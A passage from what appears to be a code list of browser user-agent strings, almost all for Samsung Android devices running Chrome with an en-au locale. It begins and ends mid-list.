'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N985F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N971N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N970F/N970FXXS6EUA1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N970F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N770F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M317F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M315F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M307F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-G977N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-G781B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-F700F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; CPH2009) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-G980F/G980FXXU3ATFG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.72 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-G973F/G973FXXS3BSL4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-G960F/G960FXXSDFTL1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A908N/KSU3CTL3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A505FN/A505FNXXS6BUA5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A426B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A217F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A015F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-J710F/J710FXXS6CTJ2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-J327R6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-J330FN/J330FNXXU3BRL1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-A530F/A530FXXU3BRL8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-A530F/A530FXXS3BRH1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.0; en-au; SAMSUNG SM-J327U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-J710F/J710FXXS6CTJ2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-J327R6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-J330FN/J330FNXXU3BRL1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-A530F/A530FXXS3BRH1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.0; en-au; SAMSUNG SM-J327U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 5.1.1; en-au; SAMSUNG SM-J320FN/J320FNXXU0ARE1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N970F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M315F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11 en-au;; SAMSUNG SM-M307FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M307F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-G980F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-G970F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-A515F/A515FXXU4DUB2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-A505F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-T725) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-S111DL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-M105G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-J610G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-J610FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-J400M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-G965N/KSU3FTJ2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-F700U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A202F/A202FXXS3BTI2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A115M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A105FN/A105FNXXS4BTG1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-T827V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-J260A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-A307GT) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-T585/T585XXS5CSH1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-J610F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.0; en-au; SAMSUNG SM-G925K/KKU3ERG1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 5.0.2; en-au; SAMSUNG SM-P905) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M515F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M317F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M315F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M215F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-G985F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-A515F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-A505GN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-T505) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-T307U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-M317F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-M307FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-J400F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A405FN/A405FNXXS3BTI3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A207F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-J810F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.72 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-J330FN/J330FNXXU4CTH2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-G950F/G950FXXSBDUA3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-A605FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-M105F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-G960W) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-A520F/A520FXXUGCTI9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.0; en-au; SAMSUNG SM-G935W8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.0; en-au; SAMSUNG SM-C7000) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.0; en-au; SAMSUNG SM-A310F/A310FXXS5CTK1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 6.0.1; en-au; SAMSUNG SM-T805M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Safari/537.36', 'Mozilla/5.0 (Linux; Android 6.0.1; en-au; SAMSUNG SM-G900F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au;SAMSUNG SM-N9750) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au;SAMSUNG SM-N975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-G988B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-A405FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-G988B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-A405FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-T295) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-T290) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-M205F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-J600GT) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-G398FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A600G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A505FN/A505FNXXS5BTI9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A205FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A202F/A202FXXU3BTK2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A105FN/A105FNXXU4BTI2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A105F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-G955F/G955FXXU9DTF1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-A705FN/A705FNXXU3ASG6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-A705FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-J530F/J530FXXS5BSE3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-G935T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.1.1; en-au; SAMSUNG SM-J250F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4252.0 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 6.0.1; en-au; SAMSUNG SM-A8000) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 5.1.1; en-au; SAMSUNG SM-A51) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-P610) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M315F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M307F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-S215DL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-P205) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-M115F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-M015G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-J600FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-G988B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A750F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A600A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A515U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A415F/A415FXXU1ATE1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A315F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A307FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A217M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A215U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A205W) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A125F/A125FXXU1ATL4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A115AZ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A107M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A025G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A015T1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-T865) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-T595) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-T510) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-M305M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-G970F/G970FXXU8DTH7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A3050) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A605K/KKU3CTF2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A505GN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-G955F/G955FXXSBDTJ1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-T385) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-G970U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-A520F/A520FXXSFCTG8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.0; en-au; SAMSUNG SM-A510F/A510FXXU7CRL2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 6.0.1; en-au; SAMSUNG SM-G906K/KTU1CPL1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 6.0.1; en-au; SAMSUNG SM-A700FD) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 5.1.1; en-au; SAMSUNG SM-T287) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-G955U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-G955U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-N9750) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-M105F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-J810M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-J810F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-J610FN) AppleWebKit/537.36 